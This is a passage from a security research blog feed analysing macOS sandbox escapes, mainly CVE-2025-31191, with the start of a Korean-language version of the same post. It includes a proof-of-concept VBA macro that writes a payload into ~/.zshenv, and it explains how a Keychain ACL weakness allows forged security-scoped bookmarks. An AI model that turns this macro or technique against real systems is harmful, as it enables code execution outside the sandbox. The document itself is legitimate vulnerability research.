class="hljs-string">&quot;SHELL&quot;</span>      <span class="hljs-keyword">if</span> ( (unsigned int)csr_check(2LL) )        objc_msgSend(v6, <span class="hljs-string">&quot;removeObjectForKey:&quot;</span>, &amp;off_1000CFE30);    }    objc_msgSend(v6, <span class="hljs-string">&quot;removeObjectForKey:&quot;</span>, &amp;off_1000CFE50);    objc_msgSend(v6, <span class="hljs-string">&quot;removeObjectForKey:&quot;</span>, &amp;off_1000CFE70);    v3-&gt;_initialEnvironment = (NSDictionary *)objc_msgSend(v6, <span class="hljs-string">&quot;copy&quot;</span>);    objc_release(v6);    objc_msgSend(v3, <span class="hljs-string">&quot;setDelegate:&quot;</span>, v3);    v8 = objc_alloc(&amp;OBJC_CLASS___NSMutableIndexSet);    v3-&gt;_availableEquivalents = (NSMutableIndexSet *)objc_msgSend(v8, <span class="hljs-string">&quot;initWithIndexesInRange:&quot;</span>, 1LL, 9LL);    v3-&gt;_windowEquivalents = (NSMutableDictionary *)objc_alloc_init(&amp;OBJC_CLASS___NSMutableDictionary);    v9 = objc_msgSend(&amp;OBJC_CLASS___NSUserDefaults, <span class="hljs-string">&quot;standardUserDefaults&quot;</span>);    v10 = objc_msgSend(v9, <span class="hljs-string">&quot;objectForKey:&quot;</span>, off_1000FF878);    <span class="hljs-keyword">if</span> ( v10 )      objc_msgSend(v3, <span class="hljs-string">&quot;setDefaultShell:&quot;</span>, v10);    objc_msgSend(v3, <span class="hljs-string">&quot;addObserver:forKeyPath:options:context:&quot;</span>, v3, &amp;off_1000CFE90, 11LL, &amp;unk_1000A4548);    v11 = objc_msgSend(&amp;OBJC_CLASS___NSNotificationCenter, <span class="hljs-string">&quot;defaultCenter&quot;</span>);    objc_msgSend(      v11,      <span class="hljs-string">&quot;addObserver:selector:name:object:&quot;</span>,      v3,      <span class="hljs-string">&quot;handleWindowKeyChange:&quot;</span>,      NSWindowDidBecomeKeyNotification,      0LL);    v3-&gt;_currentWorkspace = (TTWorkspace *)objc_alloc_init(&amp;OBJC_CLASS___TTWorkspace);    objc_msgSend(&amp;OBJC_CLASS___NSColor, <span class="hljs-string">&quot;setIgnoresAlpha:&quot;</span>, 0LL);    objc_msgSend(v3, <span class="hljs-string">&quot;initLowSwapSpaceWatcher&quot;</span>);  }  <span class="hljs-built_in">return</span> v3;}</code></pre><hr><h3 id="2-2-CVE&#x2011;2025&#x2011;31191-Security&#x2011;Scoped-Bookmarks-based-Sandbox-Escape"><a href="#2-2-CVE&#x2011;2025&#x2011;31191-Security&#x2011;Scoped-Bookmarks-based-Sandbox-Escape" class="headerlink" title="2.2 CVE&#x2011;2025&#x2011;31191: Security&#x2011;Scoped Bookmarks based Sandbox Escape"></a>2.2 CVE&#x2011;2025&#x2011;31191: Security&#x2011;Scoped Bookmarks based Sandbox Escape</h3><p>CVE-2025-31191 is based on a structural flaw that allowed sandboxed apps on macOS to exploit <strong>Security-Scoped Bookmarks</strong> to access system resources without user approval.</p><p>In addition to CVE-2022-26696 discussed in Section 2.1, there were various other Launch Services-based vulnerabilities. Subsequently, Apple strengthened App Sandbox policies within Launch Services to prevent such vulnerabilities. XPC clients are now able to recognize whether they are in a sandboxed state, rendering past vulnerabilities such as <strong>CVE-2022-26706</strong>, <strong>CVE-2021-30864</strong>, and <strong>CVE-2022-26696</strong> invalid.</p><p>These changes have also affected the Microsoft Office for macOS environment. Office apps are now configured to strictly follow macOS sandbox policies, making it difficult to attempt initial penetration using macros as before. However, we focused our analysis on the <strong>SSB (Security-Scoped Bookmark)</strong> feature, which allows file access permissions to be stored like tokens, as it remains a potential threat.</p><blockquote><p><strong>Security-Scoped Bookmark?</strong></p></blockquote><p>macOS restricts app file access permissions for security reasons, and external files cannot be accessed without the user&#x2019;s explicit approval. One of the representative features used for this purpose is <strong>Security-Scoped Bookmark</strong>.</p><p>This Bookmark allows users to store access permissions for specific files or directories like a token once they have granted access. Apps can then store this Bookmark and use it later to access files without requiring user approval again.</p><p>Two key VBA APIs related to this feature have been newly introduced in the Office environment for macOS.</p><ul><li><p><strong>AppleScriptTask</strong></p><p>  This API allows macros to execute predefined AppleScripts. However, these scripts must be located in the <code>~/Library/Application Scripts/[bundle ID]/</code> path, and since Office apps cannot access this path to create files, it was difficult to use macros for sandbox escape.</p></li><li><p><strong>GrantAccessToMultipleFiles</strong></p><p>  This API prompts the user to select multiple files within the macro and grants access to those files outside the sandbox. It is particularly useful for large-scale tasks.</p></li></ul><p>Among these, <code>AppleScriptTask</code> appeared to have no significant security issues, so we conducted a thorough analysis centered on the <code>GrantAccessToMultipleFiles</code> API.</p><blockquote><p><strong>SSB Abuse</strong></p></blockquote><p>Using the <code>GrantAccessToMultipleFiles</code> API, users can access files outside the sandbox by manually selecting and approving files. However, we discovered that <strong>the user&#x2019;s file access approval is retained even after rebooting</strong>. In other words, this approval information is <strong>permanently stored</strong> somewhere, and if exploited, it allows access to files outside the sandbox without additional user approval. !!</p><p>Based on this, we were able to come up with the following scenario.</p><ol><li>The user selects a file normally and grants access permissions.</li><li>These permissions are stored in the form of a Security-Scoped Bookmark.</li><li>A malicious macro exploits this bookmark to access specific files without any additional approval.</li><li>For example, manipulating an initial execution file such as <code>~/.zshenv</code> &#x2192; enables command execution outside the sandbox.</li></ol><blockquote><p><strong>SSB exploitation through macros</strong></p></blockquote><p>Based on the above scenario, we conducted the following tests.</p><ol><li>Open Excel or Word and open a new document.</li><li>Press the shortcut key <code>Alt + F11</code> &#x2192; Open the VBA editor.</li><li>Select <code>Insert &gt; Module</code> from the top menu.</li><li>Paste the code and execute it.<pre><code class="hljs bash">        Sub Poc_GrantAccess()            Dim scptPath As String            Dim fileAccessGranted As Boolean            Dim filePermissionCandidates            Dim payload As String                    <span class="hljs-string">&apos; Set the payload</span><span class="hljs-string">            payload = &quot;echo pwn&quot;</span><span class="hljs-string">        </span><span class="hljs-string">            &apos;</span> Grant file permissions            scptPath = <span class="hljs-string">&quot;/Users/&quot;</span> &amp; Environ(<span class="hljs-string">&quot;USER&quot;</span>) &amp; <span class="hljs-string">&quot;/.zshenv&quot;</span>            filePermissionCandidates = Array(scptPath)            fileAccessGranted = GrantAccessToMultipleFiles(filePermissionCandidates)                    <span class="hljs-string">&apos; Create an Application Script</span><span class="hljs-string">            Open scptPath For Output As #1</span><span class="hljs-string">            Print #1, payload</span><span class="hljs-string">            Close #1</span><span class="hljs-string">        End Sub</span><span class="hljs-string">        </span><span class="hljs-string">```    </span><span class="hljs-string">        </span><span class="hljs-string">        </span><span class="hljs-string"></span><span class="hljs-string">![image.png](/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image10.png)</span><span class="hljs-string"></span><span class="hljs-string">![image.png](/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image11.png)</span><span class="hljs-string"></span><span class="hljs-string">If an SSB created based on user approval information is exploited, subsequent accesses may bypass the protection of the sandbox policy.</span><span class="hljs-string"></span><span class="hljs-string">![image.png](/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image12.png)</span><span class="hljs-string"></span><span class="hljs-string">echo pwn executed successfully.</span><span class="hljs-string"></span><span class="hljs-string">&gt; **SSB Storage Location and Structure Analysis**</span><span class="hljs-string"></span><span class="hljs-string">After checking where this bookmark is stored, we found that the data storing the user&apos;</span>s choice (file access approval) was stored <span class="hljs-keyword">in</span> a PLIST file inside the Containers directory.![image.png](/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image13.png)![image.png](/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image14.png)The `Containers` directory is a special location that is not subject to App Sandbox restrictions, so even sandboxed apps can **freely access** files <span class="hljs-keyword">in</span> this directory. This means that <span class="hljs-keyword">if</span> a malicious app can manipulate this PLIST file to artificially insert SSB, it can steal arbitrary file access permissions without separate user approval!However... this PLIST file is not a simple text file but is structured as a **signed binary format**. Therefore, simply overwriting values or adding entries is not easy... &gt; **ScopedBookmarkAgent Analysis**To gain a deeper understanding of how this works, we reverse engineered the relevant macOS modules and analyzed their structure.By default, sandboxed apps must obtain file access permission from the user via an Open dialog to access external files. This Open dialog is handled by a sandbox-external service named `com.apple.appkit.xpc.openAndSavePanelService.xpc`.When the user selects a file, this service transmits the access permissions <span class="hljs-keyword">for</span> the selected file to the app <span class="hljs-keyword">in</span> the form of a sandbox extension. This extension is created by the kernel and is a token signed with `HMAC-SHA256`, containing the actual file path, permission information (such as `com.apple.app-sandbox.read-write`), file metadata, and more. Apps that receive this extension can access the file through the `libsystem_sandbox.dylib` sub-API.However, there was a limitation that this extension token was **invalidated upon each reboot**.To solve this, Apple introduced a new non-sandbox process called **ScopedBookmarkAgent**. This agent performs the following two roles.1. Verify the received sandbox extension and convert it into a Bookmark object that can be stored long-term.2. Generate and deliver a new sandbox extension token based on the stored Bookmark data.For example, apps like Microsoft Office can use SSB <span class="hljs-keyword">in</span> the following way!- User approves file access &#x2192; bookmark stored <span class="hljs-keyword">in</span> `securebookmarks.plist`- Subsequent access to the same file &#x2192; bookmark via ScopedBookmarkAgent &#x2192; new extension token generatedThis bookmark object is also signed with HMAC-SHA256, and the key used is calculated as follows.</code></pre>cryptoKey = HMAC-SHA256(secret, &#x201C;[bundle-id]&#x201D;)<br>```</li></ol><p>The <code>secret</code> used here is stored in the <code>com.apple.scopedbookmarksagent.xpc</code> item in <strong>macOS Keychain</strong>, making it very difficult for attackers to arbitrarily sign or manipulate bookmarks. Ultimately, in order to forge bookmarks for sandbox escape, attackers must steal the <strong>ScopedBookmarkAgent&#x2019;s</strong> signing key or be able to insert valid bookmarks indirectly. It&#x2019;s a bit complicated, isn&#x2019;t it?</p><blockquote><p><strong>Keychain ACL bypass</strong></p></blockquote><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image15.png" alt="image.png"></p><p>On macOS, <strong>Keychain</strong> is a space for securely storing passwords and certificates. It can be considered similar to Windows Credential Manager.<br>An important feature of Keychain is that it has an <strong>Access Control List (ACL) that specifies which processes can access each item</strong>.</p><p>The Keychain item that caught my attention was <code>com.apple.scopedbookmarksagent.xpc</code>, and its ACL was set to allow access only to <strong>ScopedBookmarkAgent</strong>.</p><p>However&#x2026;!</p><p>I discovered that this ACL only controls <strong>&#x2018;read&#x2019; permissions</strong>.</p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image16.png" alt="image.png"></p><p>In other words, it was possible to delete existing items and register <strong>new items created</strong> by attackers with the same names!</p><p>Attackers could even set <strong>ACL</strong>s for new items themselves and configure them so that ScopedBookmarkAgent could access them freely.</p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image17.png" alt="image.png"></p><p>This could be verified using the command.</p><p>As a result, if an attacker creates a new entry with a fixed secret value, ScopedBookmarkAgent will accept the key without suspicion and use it for signature verification.</p><p>Based on the above, an attacker could exploit the ACL structure of the keychain and the signature key derivation structure to <strong>manipulate and sign arbitrary SSBs</strong>, thereby <strong>gaining a sandbox escape path</strong>.</p><p>This vulnerability could affect all macOS sandboxed apps that use SSBs and was particularly dangerous because it could be exploited as a generic macOS Sandbox Escape technique not limited to a single app. </p><p>In this article, I studied Sandbox Escape! It was fun&#x2026;!!!</p><p>I&#x2019;ll study something interesting again next time~ &gt;_o</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://support.apple.com/en-us/122375">https://support.apple.com/en-us/122375</a></p><p><a href="https://www.microsoft.com/en-us/security/blog/2025/05/01/analyzing-cve-2025-31191-a-macos-security-scoped-bookmarks-based-sandbox-escape/">https://www.microsoft.com/en-us/security/blog/2025/05/01/analyzing-cve-2025-31191-a-macos-security-scoped-bookmarks-based-sandbox-escape/</a></p><p><a href="https://www.microsoft.com/en-us/security/blog/2022/07/13/uncovering-a-macos-app-sandbox-escape-vulnerability-a-deep-dive-into-cve-2022-26706/">https://www.microsoft.com/en-us/security/blog/2022/07/13/uncovering-a-macos-app-sandbox-escape-vulnerability-a-deep-dive-into-cve-2022-26706/</a></p><p><a href="https://objectivebythesea.org/v4/talks/OBTS_v4_rWaisberg.pdf">https://objectivebythesea.org/v4/talks/OBTS_v4_rWaisberg.pdf</a></p><p><a href="https://github.com/yo-yo-yo-jbo/macos_app_structure">https://github.com/yo-yo-yo-jbo/macos_app_structure</a></p><p><a href="https://wojciechregula.blog/post/macos-sandbox-escape-via-terminal/">https://wojciechregula.blog/post/macos-sandbox-escape-via-terminal/</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/clalxk/">clalxk</category>
      
      <category domain="https://hackyboiz.github.io/tags/MacOS/">MacOS</category>
      
      <category domain="https://hackyboiz.github.io/tags/Sandbox-Escape/">Sandbox Escape</category>
      
      
      <comments>https://hackyboiz.github.io/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] macOS: Part2 - Sandbox Escape (ko)</title>
      <link>https://hackyboiz.github.io/2025/08/07/clalxk/MacOS_Sandbox_Escape_ko/</link>
      <guid>https://hackyboiz.github.io/2025/08/07/clalxk/MacOS_Sandbox_Escape_ko/</guid>
      <pubDate>Thu, 07 Aug 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;a href=&quot;https://hackyboiz.github.io/2025/01/19/clalxk/MacOS_TCC-Bypass_ko/&quot;&gt;macOS: Part0 - TCC Bypass&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://hackyb</description>
        
      
      
      
      <content:encoded><![CDATA[<p><a href="https://hackyboiz.github.io/2025/01/19/clalxk/MacOS_TCC-Bypass_ko/">macOS: Part0 - TCC Bypass</a></p><p><a href="https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_ko/">macOS: Part1 - SIP Bypass</a> </p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_ko/MacOS_Sandbox_Escape.png" alt="image.png"></p><p>macOS: Part2 - Sandbox Escape &#x2190; Now!</p><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;~ clalxk&#xC785;&#xB2C8;&#xB2E4;! </p><p>&#xC624;&#xB298;&#xC740; &#xC9C0;&#xB09C; Part1&#xC5D0; &#xC774;&#xC5B4; Sandbox Escape&#xC5D0; &#xB300;&#xD574; &#xACF5;&#xBD80;&#xD574;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>macOS&#xC758; Sandbox &#xAC1C;&#xB150;&#xBD80;&#xD130; 1-day(CVE-2025-31191) &#xBD84;&#xC11D; &#xB0B4;&#xC6A9;&#xC73C;&#xB85C; &#xB2F4;&#xC558;&#xC73C;&#xB2C8; &#xD568;&#xAED8; &#xACF5;&#xBD80;&#xD574;&#xBCF4;&#xC544;&#xC694;.. (&#xCC21;&#xAE0B;_&lt;)</p><h2 id="0-App"><a href="#0-App" class="headerlink" title="0. App"></a>0. App</h2><p>Windows&#xB098; Linux&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB2E4; &#xBCF4;&#xBA74; macOS&#xC758; <code>App</code>&#xC774;&#xB77C;&#xB294; &#xAC1C;&#xB150;&#xC774; &#xC0DD;&#xC18C;&#xD558;&#xAC8C; &#xB290;&#xAEF4;&#xC9C8; &#xC218; &#xC788;&#xB294;&#xB370;&#xC694;. &#xC0DD;&#xC18C;&#xD560; &#xBFD0; &#xC5B4;&#xB835;&#xC9C4; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4; b^_^b. &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C;&#xB294; &#xD558;&#xB098;&#xC758; &#xC2E4;&#xD589;&#xD30C;&#xC77C;(<code>.exe</code>, <code>a.out</code>)&#xC744; &#xC2E4;&#xD589;&#xD558;&#xBA74; &#xACE7;&#xBC14;&#xB85C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xB3CC;&#xC544;&#xAC00;&#xACE0;, &#xD544;&#xC694;&#xD55C; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB098; &#xC124;&#xC815; &#xD30C;&#xC77C;&#xC740; &#xC2DC;&#xC2A4;&#xD15C; &#xC5B4;&#xB518;&#xAC00;&#xC5D0;&#xC11C; &#xB530;&#xB85C; &#xB85C;&#xB4DC;&#xB418;&#xB294; &#xAD6C;&#xC870;&#xB97C; &#xB5A0;&#xC62C;&#xB9AC;&#xAC8C; &#xB418;&#xC8E0;.</p><p>&#xC608;&#xB97C; &#xB4E4;&#xC5B4; Windows&#xC5D0;&#xC11C;&#xB294; <code>notepad++.exe</code>&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74;, &#xADF8; &#xD30C;&#xC77C; &#xD558;&#xB098;&#xB9CC;&#xC73C;&#xB85C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC0DD;&#xC131;&#xB418;&#xACE0; &#xB3D9;&#xC791;&#xC744; &#xC2DC;&#xC791;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xD544;&#xC694;&#xD55C; <code>.dll</code> &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB4E4;&#xC740; &#xC2DC;&#xC2A4;&#xD15C; &#xD3F4;&#xB354;&#xB098; &#xC124;&#xCE58; &#xACBD;&#xB85C;&#xC5D0;&#xC11C; &#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xBD88;&#xB7EC;&#xC624;&#xACE0;, &#xD658;&#xACBD; &#xC124;&#xC815;&#xC740; <code>.ini</code>&#xB098; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xAC19;&#xC740; &#xC678;&#xBD80; &#xC704;&#xCE58;&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7EC;&#xB098;! macOS&#xC5D0;&#xC11C;&#xB294; &#xC774; &#xAD6C;&#xC870;&#xAC00; &#xC870;&#xAE08; &#xB2E4;&#xB985;&#xB2C8;&#xB2E4;.</p><p>macOS&#xC5D0;&#xC11C;&#xB294; <code>App</code>&#xC774; &#xB2E8;&#xC21C;&#xD55C; &#xC2E4;&#xD589;&#xD30C;&#xC77C;(<code>.exe</code>, <code>.out</code>)&#xC774; &#xC544;&#xB2C8;&#xB77C;, <strong>&#xB514;&#xB809;&#xD1A0;&#xB9AC; &#xAD6C;&#xC870;</strong>&#xB97C; &#xAC00;&#xC9C4; <strong><a href="https://en.wikipedia.org/wiki/Bundle_(macOS">&#xBC88;&#xB4E4;</a>(.app)</strong>&#xC774;&#xC5D0;&#xC694;. Finder&#xC5D0;&#xC11C;&#xB294; &#xD558;&#xB098;&#xC758; &#xC571;&#xCC98;&#xB7FC; &#xBCF4;&#xC774;&#xC9C0;&#xB9CC; &#xD130;&#xBBF8;&#xB110;&#xC5D0;&#xC11C; &#xBCF4;&#xBA74; <code>.app</code>&#xC740; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC774;&#xACE0;, &#xB0B4;&#xBD80;&#xC5D0;&#xB294; &#xC2E4;&#xD589;&#xD30C;&#xC77C;&#xBFD0; &#xC544;&#xB2C8;&#xB77C; &#xD544;&#xC694;&#xD55C; <strong>&#xB9AC;&#xC18C;&#xC2A4;, &#xC124;&#xC815;&#xD30C;&#xC77C;, &#xD50C;&#xB7EC;&#xADF8;&#xC778;, &#xCF54;&#xB4DC; &#xC11C;&#xBA85; &#xC815;&#xBCF4; &#xB4F1;</strong>&#xC744; &#xB2F4;&#xACE0; &#xC788;&#xC5B4;&#xC694;.</p><p>macOS&#xB294; &#xC571;&#xC744; &#x2018;&#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xD558;&#xB098;&#x2019;&#xAC00; &#xC544;&#xB2C8;&#xB77C;, <strong>&#xC571;&#xC774; &#xC2E4;&#xD589;&#xB418;&#xAE30; &#xC704;&#xD55C; &#xBAA8;&#xB4E0; &#xAC78; &#xBB36;&#xC740; &#xD328;&#xD0A4;&#xC9C0; &#xB2E8;&#xC704;&#xB85C; &#xB2E4;&#xB8EC;&#xB2E4;</strong>&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC608;&#xC2DC;&#xB85C; &#xAE30;&#xBCF8; &#xACC4;&#xC0B0;&#xAE30; &#xC571;&#xC744; &#xC0B4;&#xD3B4;&#xBCFC;&#xAC8C;&#xC694;!</p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_ko/image1.png" alt="image.png"></p><p>&#xC774; <code>Contents</code> &#xD3F4;&#xB354; &#xC548;&#xC5D4; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xC694;&#xC18C;&#xB4E4;&#xC774; &#xB4E4;&#xC5B4; &#xC788;&#xC5B4;&#xC694;.</p><ul><li><code>MacOS/</code>: &#xC2E4;&#xD589;&#xD30C;&#xC77C;&#xC774; &#xB4E4;&#xC5B4; &#xC788;&#xB294; &#xD3F4;&#xB354;</li><li><code>Info.plist</code>: &#xC571;&#xC758; &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130;&#xB97C; &#xB2F4;&#xC740; &#xC124;&#xC815;&#xD30C;&#xC77C;</li><li><code>Resources/</code>: &#xC544;&#xC774;&#xCF58;, &#xC774;&#xBBF8;&#xC9C0;, &#xC5B8;&#xC5B4;&#xD329;, &#xB9AC;&#xC18C;&#xC2A4; &#xB4F1;</li><li><code>PlugIns/</code>: (&#xC120;&#xD0DD;) &#xD50C;&#xB7EC;&#xADF8;&#xC778;&#xB4E4;</li><li><code>_CodeSignature/</code>: (&#xC120;&#xD0DD;) &#xCF54;&#xB4DC;&#xC11C;&#xBA85; &#xC815;&#xBCF4;</li><li><code>version.plist</code>, <code>PkgInfo</code>: (&#xC120;&#xD0DD;) &#xAE30;&#xD0C0; &#xC815;&#xBCF4;</li></ul><p><code>Info.plist</code> &#xB294; &#xC571;&#xC5D0; &#xB300;&#xD55C; &#xC911;&#xC694;&#xD55C; &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130;&#xB97C; &#xB2F4;&#xACE0; &#xC788;&#xB294; XML &#xD615;&#xC2DD;&#xC758; &#xD30C;&#xC77C;&#xC774;&#xC5D0;&#xC694;.</p><p>&#xC5EC;&#xAE30;&#xC5D0;&#xB294; &#xC2E4;&#xD589;&#xD30C;&#xC77C;&#xC758; &#xACBD;&#xB85C;, &#xC571; &#xC774;&#xB984;, &#xBC88;&#xB4E4; ID, &#xBC84;&#xC804; &#xB4F1; &#xB2E4;&#xC591;&#xD55C; &#xC815;&#xBCF4;&#xAC00; &#xB4E4;&#xC5B4;&#xAC11;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>CFBundleExecutable<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>Calculator<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>CFBundleIdentifier<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>com.apple.calculator<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></code></pre><p>&#xC571;&#xC744; &#xC2E4;&#xD589;&#xD574;&#xBCFC;&#xAE4C;&#xC694;?</p><h3 id="0-1-Launching-an-App"><a href="#0-1-Launching-an-App" class="headerlink" title="0.1 Launching an App"></a><strong>0.1 Launching an App</strong></h3><p>&#xC571;&#xC744; &#xC2E4;&#xD589;&#xD55C;&#xB2E4;&#xB294; &#xAC74; &#xACB0;&#xAD6D; &#xC5B4;&#xB5A4; <strong>&#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xB294; &#xAC83;</strong>&#xC744; &#xC758;&#xBBF8;&#xD569;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC11C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; <code>CFBundleExecutable</code> &#xD0A4;&#xB85C; &#xC9C0;&#xC815;&#xB41C; &#xC2E4;&#xD589; &#xD30C;&#xC77C;&#xC774;&#xC8E0;. &#xADF8;&#xB7FC; &#xC774; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; &#xC5B4;&#xB5A4; &#xBD80;&#xBAA8; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xC544;&#xB798;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB420;&#xAE4C;&#xC694;? </p><p><em>* <code>CFBundleExecutable</code> : macOS &#xC571; &#xBC88;&#xB4E4;&#xC758; &#xC124;&#xC815; &#xD30C;&#xC77C;&#xC778; <code>Info.plist</code>&#xC5D0; &#xB4E4;&#xC5B4;&#xAC00;&#xB294; &#xD56D;&#xBAA9; &#xC911; &#xD558;&#xB098;&#xB85C;, <code>.app</code> &#xBC88;&#xB4E4; &#xC548;&#xC5D0;&#xC11C; &#xC2E4;&#xC81C;&#xB85C; &#xC2E4;&#xD589;&#xB420; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xD30C;&#xC77C;&#xC758; &#xC774;&#xB984;&#xC744; &#xC815;&#xC758;</em></p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_ko/image2.png" alt="image.png"></p><p><code>open -a Calculator</code> &#xBA85;&#xB839;&#xC740; &#xD3C9;&#xC18C;&#xC5D0; &#xACC4;&#xC0B0;&#xAE30; &#xC571;&#xC744; &#xB354;&#xBE14; &#xD074;&#xB9AD;&#xD574;&#xC11C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xAC83;&#xACFC; &#xB3D9;&#xC77C;&#xD55C;&#xB370;&#xC694;.</p><p>&#xACC4;&#xC0B0;&#xAE30;&#xAC00; &#xC2E4;&#xD589;&#xB41C; &#xC0C1;&#xD0DC;&#xC5D0;&#xC11C; <code>ps</code> &#xBA85;&#xB839;&#xC5B4;&#xB85C; &#xD604;&#xC7AC; &#xC2E4;&#xD589; &#xC911;&#xC778; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB4E4;&#xC744; &#xD655;&#xC778;&#xD574;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>/System/Applications/Calculator.app/Contents/MacOS/Calculator</code>&#xAC00; &#xC2E4;&#xD589; &#xC911;&#xC774;&#xACE0;, &#xD504;&#xB85C;&#xC138;&#xC2A4; ID(PID)&#xB294; 5012&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7F0;&#xB370; &#xBD80;&#xBAA8; &#xD504;&#xB85C;&#xC138;&#xC2A4; ID(PPID)&#xB97C; &#xBCF4;&#xBA74; <code>1</code>&#xC774;&#xC5D0;&#xC694;!</p><p>macOS&#xC5D0;&#xC11C; PID 1&#xC740; <code>/sbin/launchd</code>&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xB140;&#xC11D;&#xC740; macOS&#xC5D0;&#xC11C; <strong>&#xC2DC;&#xC2A4;&#xD15C; &#xC804;&#xCCB4; &#xBC0F; &#xC0AC;&#xC6A9;&#xC790;&#xBCC4; &#xB370;&#xBAAC;/&#xC5D0;&#xC774;&#xC804;&#xD2B8;&#xB97C; &#xAD00;&#xB9AC;&#xD558;&#xB294; &#xAD00;&#xB9AC;&#xC790; &#xC5ED;&#xD560;</strong>&#xC744; &#xD574;&#xC694;. Windows&#xC758; <code>services.exe</code>&#xB098; Linux&#xC758; <code>systemd</code>&#xC640; &#xBE44;&#xC2B7;&#xD558;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. launchd&#xB294; &#xB2E8;&#xC21C;&#xD788; &#xBC31;&#xADF8;&#xB77C;&#xC6B4;&#xB4DC; &#xC11C;&#xBE44;&#xC2A4;&#xB9CC; &#xAD00;&#xB9AC;&#xD558;&#xB294; &#xAC8C; &#xC544;&#xB2C8;&#xB77C;, <strong>&#xBAA8;&#xB4E0; &#xC571;&#xC758; &#xBD80;&#xBAA8; &#xC5ED;&#xD560;</strong>&#xB3C4; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xC0AC;&#xC6A9;&#xC790;&#xB4E4;&#xC740; macOS&#xC5D0;&#xC11C; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; <code>.app</code>&#xC744; &#xC2E4;&#xD589;&#xD560; &#xB54C;, GUI&#xC5D0;&#xC11C; &#xB354;&#xBE14;&#xD074;&#xB9AD;&#xD558;&#xAC70;&#xB098; <code>open -a</code> &#xAC19;&#xC740; &#xBA85;&#xB839;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB7F4; &#xACBD;&#xC6B0; &#xC2E4;&#xC81C; &#xC571;&#xC740; <code>launchd</code>(PID 1)&#xC758; &#xC790;&#xC2DD; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB85C; &#xC2E4;&#xD589;&#xB3FC;&#xC694;. &#xADF8;&#xB807;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xBAA8;&#xB4E0; &#xC571;&#xC758; &#xBD80;&#xBAA8; &#xC5ED;&#xD560;&#xC744; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. 